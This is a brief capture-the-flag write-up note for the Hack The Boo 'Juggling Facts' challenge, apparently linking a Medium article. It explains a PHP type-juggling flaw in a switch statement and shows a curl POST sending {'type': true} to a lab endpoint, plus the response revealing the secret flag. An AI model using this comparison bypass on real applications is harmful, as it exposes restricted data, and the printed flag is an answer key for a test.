'''
https://medium.com/codex/hack-the-boo-juggling-facts-fb79f2224ec1

The problem here is that the switch function uses weak (untyped) comparisons for the checks while the secret type check is done with a strict “===” comparison. And also pay attention to the switch-case code.

curl -X POST -d '{"type": true}' http://83.136.250.104:39443/api/getfacts     

{"facts":[{"id":19,"fact":"HTB{juggl1ng_1s_d4ng3r0u5!!!}","fact_type":"secrets"}]}

'''
